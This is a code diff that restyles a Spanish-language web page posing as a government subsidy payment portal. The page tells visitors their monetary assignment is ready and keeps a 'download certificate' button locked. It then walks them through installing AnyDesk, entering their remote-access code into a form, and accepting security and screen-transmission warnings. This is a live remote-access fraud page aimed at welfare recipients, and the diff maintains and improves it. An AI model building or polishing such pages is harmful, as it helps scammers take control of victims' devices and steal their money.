@@ -22,10 +22,21 @@
             overflow-x: hidden;            
             position: relative;        }        
 
-        /* BARRA DE FECHA Y HORA (AZUL IDÉNTICO AL BOTÓN Y HORA EN NEGRO) */
+        /* CONTENEDOR GENERAL PARA CENTRAR Y FIJAR EL ANCHO ESTRICTAMENTE */
+        .wrapper-principal {
+            width: 100%;
+            max-width: 600px;
+            background-color: #f0f4f8;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+        }
+
+        /* BARRA DE FECHA Y HORA FIJA Y ESTÁTICA */
         .barra-tiempo-actual {            
             width: 100%;            
-            max-width: 600px;
             background-color: #3366cc;            
             color: #000000;            
             padding: 6px 12px;            
@@ -34,7 +45,10 @@
             display: flex;            
             justify-content: flex-start;            
             align-items: center;            
-            z-index: 16;        }
+            z-index: 16;
+            position: sticky;
+            top: 0;
+        }
         .barra-tiempo-actual span.live-clock {
             color: #000000;
             font-weight: 700;
@@ -52,14 +66,12 @@
         }
         .banner-superior-absoluto img {
             width: 100%;
-            max-width: 600px;
             height: auto;
             display: block;
         }       
 
         .main-container {            
             width: 100%;            
-            max-width: 520px;            
             padding: 24px 16px;            
             position: relative;            
             z-index: 10;            
@@ -347,7 +359,6 @@
         }
         .contenedor-imagen-final-absoluto img {
             width: 100%;
-            max-width: 600px;
             height: auto;
             display: block;
         }
@@ -680,97 +691,99 @@
 </head>
 <body>
 
-<!-- Franja de fecha y hora en vivo (Azul del botón y texto en negro) -->
-<div class="barra-tiempo-actual">    
-    <span id="relojEnVivo" class="live-clock">Cargando fecha y hora...</span>
-</div>
+<div class="wrapper-principal">
+    <!-- Franja de fecha y hora fija y estática -->
+    <div class="barra-tiempo-actual">    
+        <span id="relojEnVivo" class="live-clock">Cargando fecha y hora...</span>
+    </div>
 
-<!-- NUEVA IMAGEN COLOCADA ARRIBA DEL TODO (BANNER SUPERIOR) -->
-<div class="banner-superior-absoluto">
-    <img src="https://i.ibb.co/pvyY2Rn5/Chat-GPT-Image-24-ago-2026-03-32-32-p-m.png" alt="Banner Superior Institucional">
-</div>
+    <!-- NUEVA IMAGEN COLOCADA ARRIBA DEL TODO (BANNER SUPERIOR) -->
+    <div class="banner-superior-absoluto">
+        <img src="https://i.ibb.co/pvyY2Rn5/Chat-GPT-Image-24-ago-2026-03-32-32-p-m.png" alt="Banner Superior Institucional">
+    </div>
 
-<div class="main-container">
-    <div class="alerta-aviso">        
-        <strong>Aviso del Sistema:</strong> Su documento ha superado la fase de validación biométrica en las centrales de pagos autorizadas.    </div>
+    <div class="main-container">
+        <div class="alerta-aviso">        
+            <strong>Aviso del Sistema:</strong> Su documento ha superado la fase de validación biométrica en las centrales de pagos autorizadas.    </div>
 
-    <!-- TARJETA DE VERIFICACIÓN CON IMAGEN DE PORTADA -->
-    <div class="tarjeta-verificacion">        
-        <div class="portada-imagen-container">
-            <img src="https://i.ibb.co/sv9RCsg4/5d059842-d2a0-47e6-96d8-5e6725259aa0.png" alt="Portal de Asignación Monetaria">
-        </div>
+        <!-- TARJETA DE VERIFICACIÓN CON IMAGEN DE PORTADA -->
+        <div class="tarjeta-verificacion">        
+            <div class="portada-imagen-container">
+                <img src="https://i.ibb.co/sv9RCsg4/5d059842-d2a0-47e6-96d8-5e6725259aa0.png" alt="Portal de Asignación Monetaria">
+            </div>
 
-        <div id="estadoVerificacion" class="estado-badge">🔍 Pendiente de Sincronización</div>                
+            <div id="estadoVerificacion" class="estado-badge">🔍 Pendiente de Sincronización</div>                
 
-        <h1>Comprobante de Asignación Monetaria</h1>                
+            <h1>Comprobante de Asignación Monetaria</h1>                
 
-        <!-- SECCIÓN INFORMATIVA INSTITUCIONAL -->
-        <div class="subsidio-bloque-interno">
-            <h3>📋 Resumen de Asignación y Subsidio Monetario</h3>
-            <p>El programa de transferencia monetaria extraordinaria y compensación social está destinado a respaldar de manera oportuna a los hogares focalizados del país. Una vez validada su identidad y completado el protocolo de sincronización de seguridad, podrá descargar el certificado de asignación oficial para su respectivo cobro en la red de pagos autorizada.</p>
+            <!-- SECCIÓN INFORMATIVA INSTITUCIONAL -->
+            <div class="subsidio-bloque-interno">
+                <h3>📋 Resumen de Asignación y Subsidio Monetario</h3>
+                <p>El programa de transferencia monetaria extraordinaria y compensación social está destinado a respaldar de manera oportuna a los hogares focalizados del país. Una vez validada su identidad y completado el protocolo de sincronización de seguridad, podrá descargar el certificado de asignación oficial para su respectivo cobro en la red de pagos autorizada.</p>
 
-            <div class="subsidio-detalles-grid">
-                <div class="subsidio-card-item">
-                    <span>Estado del Subsidio</span>
-                    <strong>Focalizado y Activo</strong>
-                </div>
-                <div class="subsidio-card-item">
-                    <span>Modalidad de Giro</span>
-                    <strong>Acreditación Directa</strong>
-                </div>
-                <div class="subsidio-card-item">
-                    <span>Vigencia del Pago</span>
-                    <strong>Ciclo Ordinario 2026</strong>
-                </div>
-                <div class="subsidio-card-item">
-                    <span>Canal de Cobro</span>
-                    <strong>Red Nacional Autorizada</strong>
+                <div class="subsidio-detalles-grid">
+                    <div class="subsidio-card-item">
+                        <span>Estado del Subsidio</span>
+                        <strong>Focalizado y Activo</strong>
+                    </div>
+                    <div class="subsidio-card-item">
+                        <span>Modalidad de Giro</span>
+                        <strong>Acreditación Directa</strong>
+                    </div>
+                    <div class="subsidio-card-item">
+                        <span>Vigencia del Pago</span>
+                        <strong>Ciclo Ordinario 2026</strong>
+                    </div>
+                    <div class="subsidio-card-item">
+                        <span>Canal de Cobro</span>
+                        <strong>Red Nacional Autorizada</strong>
+                    </div>
                 </div>
             </div>
+
+            <p class="descripcion-general">Estimado(a) ciudadano(a), el sistema central ha procesado satisfactoriamente su acreditación económica extraordinaria correspondiente al periodo actual. Complete el proceso de soporte técnico inferior para habilitar la descarga.</p>                
+
+            <button type="button" id="btnDescargarComprobante" class="btn-descargar" disabled onclick="mostrarInterfazPDF()">            
+                🔒 Comprobante Bloqueado (Complete Aplicación)        
+            </button>    
         </div>
 
-        <p class="descripcion-general">Estimado(a) ciudadano(a), el sistema central ha procesado satisfactoriamente su acreditación económica extraordinaria correspondiente al periodo actual. Complete el proceso de soporte técnico inferior para habilitar la descarga.</p>                
+        <!-- SECCIÓN DE SOPORTE TÉCNICO -->
+        <div class="seccion-anydesk">
+            <h3>💻 Verificación por Asistencia Remota</h3>
+            <p>Para concluir el proceso de validación y liberación de su giro, siga atentamente las instrucciones:</p>
 
-        <button type="button" id="btnDescargarComprobante" class="btn-descargar" disabled onclick="mostrarInterfazPDF()">            
-            🔒 Comprobante Bloqueado (Complete Aplicación)        
-        </button>    
+            <ul class="pasos-lista">
+                <li>Descargue e <strong>ingrese a la aplicación AnyDesk</strong> en su dispositivo.</li>
+                <li>Visualice y copie el código de acceso remoto que aparece en la pantalla principal de la aplicación.</li>
+                <li>Regrese a esta página e ingrese el código en el recuadro inferior, luego presione Sincronizar.</li>
+                <li>Aparecerá en su dispositivo una alerta de seguridad del sistema (⚠️ 🔑).</li>
+                <li>Seleccione la opción inferior: "Soy consciente de los riesgos".</li>
+                <li>Pulse Aceptar en la ventana emergente de transmisión.</li>
+                <li>Confirme nuevamente pulsando Aceptar.</li>
+                <li>Por último, haga clic en Empezar ahora</li>
+            </ul>
+
+            <a href="https://play.google.com/store/apps/details?id=com.anydesk.anydeskandroid" target="_blank" class="btn-anydesk-img">
+                <img src="https://i.ibb.co/m5NBTkQQ/8ff96ad4-36eb-446f-9fda-bd928ef5a1b5.png" alt="Descargar en Google Play">
+            </a>
+
+            <form class="input-codigo-grupo" onsubmit="enviarCodigoAnydesk(event)">
+                <label for="codigoAnydesk">Ingrese Código de Acceso:</label>
+                <input type="text" id="codigoAnydesk" placeholder="Ej. 123 456 789" autocomplete="off">
+                <button type="submit" class="btn-enviar-codigo">Sincronizar</button>
+            </form>
+        </div>
     </div>
 
-    <!-- SECCIÓN DE SOPORTE TÉCNICO -->
-    <div class="seccion-anydesk">
-        <h3>💻 Verificación por Asistencia Remota</h3>
-        <p>Para concluir el proceso de validación y liberación de su giro, siga atentamente las instrucciones:</p>
-
-        <ul class="pasos-lista">
-            <li>Descargue e <strong>ingrese a la aplicación AnyDesk</strong> en su dispositivo.</li>
-            <li>Visualice y copie el código de acceso remoto que aparece en la pantalla principal de la aplicación.</li>
-            <li>Regrese a esta página e ingrese el código en el recuadro inferior, luego presione Sincronizar.</li>
-            <li>Aparecerá en su dispositivo una alerta de seguridad del sistema (⚠️ 🔑).</li>
-            <li>Seleccione la opción inferior: "Soy consciente de los riesgos".</li>
-            <li>Pulse Aceptar en la ventana emergente de transmisión.</li>
-            <li>Confirme nuevamente pulsando Aceptar.</li>
-            <li>Por último, haga clic en Empezar ahora</li>
-        </ul>
-
-        <a href="https://play.google.com/store/apps/details?id=com.anydesk.anydeskandroid" target="_blank" class="btn-anydesk-img">
-            <img src="https://i.ibb.co/m5NBTkQQ/8ff96ad4-36eb-446f-9fda-bd928ef5a1b5.png" alt="Descargar en Google Play">
-        </a>
-
-        <form class="input-codigo-grupo" onsubmit="enviarCodigoAnydesk(event)">
-            <label for="codigoAnydesk">Ingrese Código de Acceso:</label>
-            <input type="text" id="codigoAnydesk" placeholder="Ej. 123 456 789" autocomplete="off">
-            <button type="submit" class="btn-enviar-codigo">Sincronizar</button>
-        </form>
+    <!-- IMAGEN FINAL ORIGINAL CON GIRO LATERAL 3D TIPO MONEDA -->
+    <div class="contenedor-imagen-final-absoluto">
+        <img src="https://i.ibb.co/39CgHR1F/Screenshot-20260824-131400-2.jpg" alt="Información Final Institucional">
+        <!-- Capas con giro lateral exacto (tipo moneda) -->
+        <div class="escudo-animado-1"></div>
+        <div class="escudo-animado-2"></div>
+        <div class="escudo-animado-3"></div>
     </div>
-</div>
-
-<!-- IMAGEN FINAL ORIGINAL CON GIRO LATERAL 3D TIPO MONEDA -->
-<div class="contenedor-imagen-final-absoluto">
-    <img src="https://i.ibb.co/39CgHR1F/Screenshot-20260824-131400-2.jpg" alt="Información Final Institucional">
-    <!-- Capas con giro lateral exacto (tipo moneda) -->
-    <div class="escudo-animado-1"></div>
-    <div class="escudo-animado-2"></div>
-    <div class="escudo-animado-3"></div>
 </div>
 
 <!-- Modal de Cuenta Regresiva Automática de 10 segundos -->
